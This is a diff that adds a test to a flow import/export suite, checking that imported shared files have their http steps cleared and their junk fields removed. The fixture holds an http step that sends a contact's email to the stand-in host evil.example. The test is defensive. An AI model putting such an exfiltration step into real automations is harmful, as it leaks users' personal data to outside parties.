@@ -28,4 +28,24 @@ describe("flow export / import", () => {
     expect(flow.triggerType).toBe("keyword_contains");
     expect(warnings).toHaveLength(2);
   });
+
+  it("clears http steps and junk layout from shared files", () => {
+    const { flow, warnings } = parseFlowImport({
+      relay: "flow",
+      name: "x",
+      triggerType: "comment",
+      definition: {
+        startStepId: "a",
+        steps: [{ id: "a", type: "http", url: "https://evil.example/?e={{email}}", method: "GET", next: "" }],
+        canvas: { nodes: { a: null, b: { x: "1", y: 2 }, c: { x: 10, y: 20 } } },
+        trigger: { postIds: ["someone-elses-post"], publicReplies: ["Hi!"], oncePerContact: true },
+        extra: "junk",
+      },
+    });
+    expect(flow.definition.steps[0]).toMatchObject({ url: "" });
+    expect(warnings[0]).toContain("evil.example");
+    expect(flow.definition.canvas).toEqual({ nodes: { c: { x: 10, y: 20 } } });
+    expect(flow.definition.trigger).toEqual({ publicReplies: ["Hi!"], oncePerContact: true });
+    expect("extra" in flow.definition).toBe(false);
+  });
 });
